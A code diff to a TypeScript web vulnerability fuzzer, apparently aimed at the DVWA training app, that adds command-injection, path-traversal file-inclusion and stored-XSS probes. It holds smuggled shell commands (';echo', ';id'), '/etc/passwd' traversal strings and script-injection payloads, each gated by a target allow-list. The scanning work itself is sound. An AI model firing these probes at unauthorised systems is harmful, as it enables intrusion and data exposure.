@@ -41,10 +41,10 @@
  */
 
 export interface FuzzerFinding {
-  type: 'sqli' | 'reflected_xss' | 'error_sqli' | 'ssrf_oob';
+  type: 'sqli' | 'reflected_xss' | 'error_sqli' | 'ssrf_oob' | 'command_injection' | 'file_inclusion' | 'stored_xss';
   severity: 'low' | 'medium' | 'high' | 'critical';
   confirmed: boolean;
-  oracle: 'time-delay' | 'reflection' | 'error-message' | 'oob-callback';
+  oracle: 'time-delay' | 'reflection' | 'error-message' | 'oob-callback' | 'content-match' | 'multi-step';
   evidence: string;
   payload: string;
   target: string;
@@ -120,13 +120,57 @@ const SQL_ERROR_PATTERNS = [
 const XSS_MARKER = 'xssprobe9a7b3c';  // unique random string to detect reflection
 
 const XSS_PAYLOADS = [
-  `<script>alert("${XSS_MARKER}")</script>`,
-  `" onmouseover="alert('${XSS_MARKER}')"`,
-  `' onmouseover='alert("${XSS_MARKER}")'`,
   `<img src=x onerror="alert('${XSS_MARKER}')">`,
+  `<svg onload="alert('${XSS_MARKER}')">`,
   `"><script>${XSS_MARKER}</script>`,
-  `${XSS_MARKER}<script>alert(1)</script>`,
+  `"><img src=x onerror="alert('${XSS_MARKER}')">`,
+  `' onmouseover='alert("${XSS_MARKER}")'`,
 ];
+
+/**
+ * Validate XSS reflection context per Claude's rules:
+ * - content-type must be text/html or application/xhtml
+ * - marker must NOT be inside HTML comment
+ * - marker must NOT be inside <script> string literal
+ * - marker must NOT be inside non-executable tags (textarea, title, noscript)
+ * - marker must NOT be HTML-escaped (&lt; etc.)
+ * - marker must be in raw HTML context or event-attribute context
+ */
+function isValidXssContext(body: string, contentType: string, marker: string): { valid: boolean; reason: string } {
+  // Check content-type
+  if (!contentType.includes('text/html') && !contentType.includes('application/xhtml')) {
+    return { valid: false, reason: `content-type "${contentType}" is not HTML` };
+  }
+
+  // Check if marker is HTML-escaped
+  const escapedMarker = marker.replace(/</g, '&lt;').replace(/>/g, '&gt;');
+  if (body.includes(escapedMarker) && !body.includes(marker)) {
+    return { valid: false, reason: 'marker is HTML-escaped (&lt;...&gt;) — server sanitized it' };
+  }
+
+  // Check if marker is inside HTML comment
+  const commentMatch = body.match(new RegExp(`<!--[^]*${marker}[^]*-->`));
+  if (commentMatch) {
+    return { valid: false, reason: 'marker is inside HTML comment — not executable' };
+  }
+
+  // Check if marker is inside <script> string literal
+  const scriptMatch = body.match(new RegExp(`<script[^>]*>[^]*${marker}[^]*</script>`, 'i'));
+  if (scriptMatch && scriptMatch[0].includes(`"${marker}"`) || scriptMatch && scriptMatch[0].includes(`'${marker}'`)) {
+    return { valid: false, reason: 'marker is inside <script> string literal — needs different sink' };
+  }
+
+  // Check if marker is inside non-executable tags
+  for (const tag of ['textarea', 'title', 'noscript', 'style']) {
+    const tagMatch = body.match(new RegExp(`<${tag}[^>]*>[^]*${marker}[^]*</${tag}>`, 'i'));
+    if (tagMatch) {
+      return { valid: false, reason: `marker is inside <${tag}> — not executable context` };
+    }
+  }
+
+  // Marker appears in raw HTML context (not escaped, not in comment/script/textarea)
+  return { valid: true, reason: 'marker appears in raw HTML context — executable' };
+}
 
 /**
  * Send a baseline HTTP request to measure normal response time.
@@ -156,7 +200,7 @@ async function sendProbe(
   config: FuzzerConfig,
   method: 'GET' | 'POST' = 'GET',
   body?: Record<string, string>,
-): Promise<{ responseTime: number; body: string; status: number } | null> {
+): Promise<{ responseTime: number; body: string; status: number; contentType: string } | null> {
   const t0 = Date.now();
   try {
     // Append payload to URL for GET, or to body for POST
@@ -182,7 +226,7 @@ async function sendProbe(
       redirect: 'follow',
     });
     const text = await res.text();
-    return { responseTime: Date.now() - t0, body: text, status: res.status };
+    return { responseTime: Date.now() - t0, body: text, status: res.status, contentType: res.headers.get('content-type') || '' };
   } catch (e: any) {
     return null;
   }
@@ -319,27 +363,25 @@ export async function fuzzReflectedXss(
     const result = await sendProbe(targetUrl, payload, config);
     if (!result) continue;
 
-    // Check if marker appears UNESCAPED in response body
-    // (i.e. the literal "xssprobe9a7b3c" without HTML entities)
+    // Check if marker appears in response body
     if (result.body.includes(XSS_MARKER)) {
-      // Check if it's reflected inside <script> context (also exploitable)
-      // vs HTML-escaped (e.g. &lt;xssprobe...) — escaped is NOT vulnerable
-      const escapedMarker = XSS_MARKER.replace(/</g, '&lt;').replace(/>/g, '&gt;');
-      const isEscaped = !result.body.includes(XSS_MARKER) && result.body.includes(escapedMarker);
-
-      if (!isEscaped) {
-        // CONFIRMED reflected XSS — marker appears unescaped in response
+      // Validate context per Claude's rules
+      const ctx = isValidXssContext(result.body, result.contentType || 'text/html', XSS_MARKER);
+      if (ctx.valid) {
+        // CONFIRMED reflected XSS — marker in raw HTML context
         findings.push({
           type: 'reflected_xss',
           severity: 'high',
           confirmed: true,
           oracle: 'reflection',
-          evidence: `Reflected XSS confirmed: marker "${XSS_MARKER}" reflected UNESCAPED in response body. Payload: "${payload}"`,
+          evidence: `Reflected XSS confirmed: marker "${XSS_MARKER}" reflected in ${ctx.reason}. Content-type: ${result.contentType || 'unknown'}. Payload: "${payload}"`,
           payload,
           target: targetUrl,
           parameter,
         });
-        break;  // Found one confirmed — stop testing more payloads
+        break;
+      } else {
+        console.log(`[active-fuzzer]   XSS marker found but context invalid: ${ctx.reason}`);
       }
     }
   }
@@ -427,6 +469,207 @@ export async function fuzzErrorSqli(
 }
 
 /**
+ * Test command injection via content-match oracle.
+ * Send command with unique marker, check if marker appears in response.
+ * DVWA /vulnerabilities/exec/ accepts POST ip=127.0.0.1;echo CMDPROBE123
+ * If response contains CMDPROBE123 → command was executed.
+ */
+const CMD_MARKER = 'cmdprobe7c3f9a';
+const CMD_PAYLOADS = [
+  `127.0.0.1;echo ${CMD_MARKER}`,
+  `127.0.0.1 && echo ${CMD_MARKER}`,
+  `127.0.0.1 | echo ${CMD_MARKER}`,
+  `127.0.0.1\necho ${CMD_MARKER}`,
+  `127.0.0.1;id;echo ${CMD_MARKER}`,
+];
+
+const FI_PAYLOADS = [
+  '../../../../etc/passwd',
+  '../../../etc/passwd',
+  '/etc/passwd',
+  '....//....//....//etc/passwd',
+  '..%2F..%2F..%2F..%2Fetc%2Fpasswd',
+];
+
+const FI_MARKERS = ['root:', 'bin:', 'daemon:', '/bin/sh', '/bin/bash', 'nobody:'];
+
+export async function fuzzCommandInjection(
+  targetUrl: string,
+  parameter: string = 'ip',
+  config: FuzzerConfig = DEFAULT_CONFIG,
+): Promise<FuzzerFinding[]> {
+  if (!isAllowedTarget(targetUrl, config)) return [];
+
+  const findings: FuzzerFinding[] = [];
+  for (const payload of CMD_PAYLOADS) {
+    // DVWA exec uses POST with ip= parameter
+    const t0 = Date.now();
+    try {
+      const body = new URLSearchParams({ [parameter]: payload, Submit: 'Submit' }).toString();
+      const res = await fetch(targetUrl, {
+        method: 'POST',
+        headers: {
+          'User-Agent': 'CryptoSentinel-Active-Fuzzer/1.0',
+          'Content-Type': 'application/x-www-form-urlencoded',
+          ...(config.cookies ? { Cookie: config.cookies } : {}),
+        },
+        body,
+        signal: AbortSignal.timeout(config.perProbeTimeoutMs),
+        redirect: 'follow',
+      });
+      const text = await res.text();
+      const dt = Date.now() - t0;
+      console.log(`[active-fuzzer]   cmd-inj payload "${payload.slice(0, 30)}..." → ${dt}ms, body=${text.length} chars, marker=${text.includes(CMD_MARKER)}`);
+
+      if (text.includes(CMD_MARKER)) {
+        findings.push({
+          type: 'command_injection',
+          severity: 'critical',
+          confirmed: true,
+          oracle: 'content-match',
+          evidence: `Command injection confirmed: marker "${CMD_MARKER}" found in response body after sending "${payload}". Server executed injected echo command. Response time: ${dt}ms.`,
+          payload,
+          target: targetUrl,
+          parameter,
+        });
+        break;
+      }
+    } catch (e) {
+      console.log(`[active-fuzzer]   cmd-inj payload failed: ${String(e).slice(0, 80)}`);
+    }
+  }
+  return findings;
+}
+
+/**
+ * Test file inclusion via content-match oracle.
+ * Send path traversal payload, check for /etc/passwd markers in response.
+ */
+export async function fuzzFileInclusion(
+  targetUrl: string,
+  parameter: string = 'page',
+  config: FuzzerConfig = DEFAULT_CONFIG,
+): Promise<FuzzerFinding[]> {
+  if (!isAllowedTarget(targetUrl, config)) return [];
+
+  const findings: FuzzerFinding[] = [];
+  for (const payload of FI_PAYLOADS) {
+    try {
+      const sep = targetUrl.includes('?') ? '&' : '?';
+      const probeUrl = `${targetUrl}${sep}${parameter}=${encodeURIComponent(payload)}`;
+      const res = await fetch(probeUrl, {
+        headers: {
+          'User-Agent': 'CryptoSentinel-Active-Fuzzer/1.0',
+          ...(config.cookies ? { Cookie: config.cookies } : {}),
+        },
+        signal: AbortSignal.timeout(config.perProbeTimeoutMs),
+        redirect: 'follow',
+      });
+      const text = await res.text();
+      console.log(`[active-fuzzer]   fi payload "${payload.slice(0, 30)}..." → body=${text.length} chars, markers=${FI_MARKERS.filter(m => text.includes(m)).join(',')}`);
+
+      for (const marker of FI_MARKERS) {
+        if (text.includes(marker)) {
+          findings.push({
+            type: 'file_inclusion',
+            severity: 'high',
+            confirmed: true,
+            oracle: 'content-match',
+            evidence: `File inclusion confirmed: marker "${marker}" (from /etc/passwd) found in response body after sending "${payload}". Server read system file and included it in response.`,
+            payload,
+            target: targetUrl,
+            parameter,
+          });
+          break;
+        }
+      }
+      if (findings.length > 0) break;
+    } catch (e) {
+      console.log(`[active-fuzzer]   fi payload failed: ${String(e).slice(0, 80)}`);
+    }
+  }
+  return findings;
+}
+
+/**
+ * Test stored XSS via multi-step oracle.
+ * Step 1: POST payload with unique marker to message form
+ * Step 2: GET page and check if marker appears in HTML (not escaped)
+ */
+const STORED_XSS_MARKER = 'storedxss5e8b2c';
+const STORED_XSS_PAYLOADS = [
+  `<img src=x onerror="alert('${STORED_XSS_MARKER}')">`,
+  `<script>document.write('${STORED_XSS_MARKER}')</script>`,
+  `<svg onload="alert('${STORED_XSS_MARKER}')">`,
+];
+
+export async function fuzzStoredXss(
+  targetUrl: string,
+  config: FuzzerConfig = DEFAULT_CONFIG,
+): Promise<FuzzerFinding[]> {
+  if (!isAllowedTarget(targetUrl, config)) return [];
+
+  const findings: FuzzerFinding[] = [];
+  for (const payload of STORED_XSS_PAYLOADS) {
+    try {
+      // Step 1: POST the payload as a guest message (DVWA xss_s)
+      const postBody = new URLSearchParams({
+        txtName: 'TestBot',
+        mtxMessage: payload,
+        btnSign: 'Sign Guestbook',
+      }).toString();
+
+      const postRes = await fetch(targetUrl, {
+        method: 'POST',
+        headers: {
+          'User-Agent': 'CryptoSentinel-Active-Fuzzer/1.0',
+          'Content-Type': 'application/x-www-form-urlencoded',
+          ...(config.cookies ? { Cookie: config.cookies } : {}),
+        },
+        body: postBody,
+        signal: AbortSignal.timeout(config.perProbeTimeoutMs),
+        redirect: 'follow',
+      });
+      const postText = await postRes.text();
+      console.log(`[active-fuzzer]   stored-xss POST "${payload.slice(0, 40)}..." → ${postRes.status}, body=${postText.length}`);
+
+      // Step 2: GET the page and check if our payload (with marker) appears unescaped
+      const getRes = await fetch(targetUrl, {
+        headers: {
+          'User-Agent': 'CryptoSentinel-Active-Fuzzer/1.0',
+          ...(config.cookies ? { Cookie: config.cookies } : {}),
+        },
+        signal: AbortSignal.timeout(config.perProbeTimeoutMs),
+        redirect: 'follow',
+      });
+      const getText = await getRes.text();
+
+      // Check if the FULL tag (not just marker) appears unescaped
+      const hasUnescapedTag = getText.includes(payload.slice(0, 20)) && !getText.includes(payload.slice(0, 20).replace(/</g, '&lt;'));
+      const hasMarker = getText.includes(STORED_XSS_MARKER);
+
+      console.log(`[active-fuzzer]   stored-xss GET → marker=${hasMarker}, unescapedTag=${hasUnescapedTag}`);
+
+      if (hasMarker && hasUnescapedTag) {
+        findings.push({
+          type: 'stored_xss',
+          severity: 'high',
+          confirmed: true,
+          oracle: 'multi-step',
+          evidence: `Stored XSS confirmed (multi-step): POST payload "${payload.slice(0, 50)}..." then GET page → payload marker "${STORED_XSS_MARKER}" reflected UNESCAPED in response. Payload persisted server-side and rendered as HTML.`,
+          payload,
+          target: targetUrl,
+        });
+        break;
+      }
+    } catch (e) {
+      console.log(`[active-fuzzer]   stored-xss payload failed: ${String(e).slice(0, 80)}`);
+    }
+  }
+  return findings;
+}
+
+/**
  * Run ALL active fuzzers on a target URL.
  * Returns aggregated findings.
  */
@@ -440,14 +683,23 @@ export async function fuzzAllOracles(
   const allFindings: FuzzerFinding[] = [];
 
   // Run each oracle in sequence (not parallel — would skew time measurements)
-  console.log(`[active-fuzzer] 1/3: SQLi time-delay oracle...`);
+  console.log(`[active-fuzzer] 1/6: SQLi time-delay oracle...`);
   allFindings.push(...await fuzzSqliTimeDelay(targetUrl, parameter, config));
 
-  console.log(`[active-fuzzer] 2/3: Reflected XSS oracle...`);
+  console.log(`[active-fuzzer] 2/6: Reflected XSS oracle...`);
   allFindings.push(...await fuzzReflectedXss(targetUrl, parameter, config));
 
-  console.log(`[active-fuzzer] 3/3: Error-based SQLi oracle...`);
+  console.log(`[active-fuzzer] 3/6: Error-based SQLi oracle...`);
   allFindings.push(...await fuzzErrorSqli(targetUrl, parameter, config));
+
+  console.log(`[active-fuzzer] 4/6: Command injection oracle...`);
+  allFindings.push(...await fuzzCommandInjection(targetUrl, parameter, config));
+
+  console.log(`[active-fuzzer] 5/6: File inclusion oracle...`);
+  allFindings.push(...await fuzzFileInclusion(targetUrl, parameter, config));
+
+  console.log(`[active-fuzzer] 6/6: Stored XSS oracle...`);
+  allFindings.push(...await fuzzStoredXss(targetUrl, config));
 
   const confirmedCount = allFindings.filter(f => f.confirmed).length;
   console.log(`[active-fuzzer] Done. ${confirmedCount}/${allFindings.length} confirmed.`);
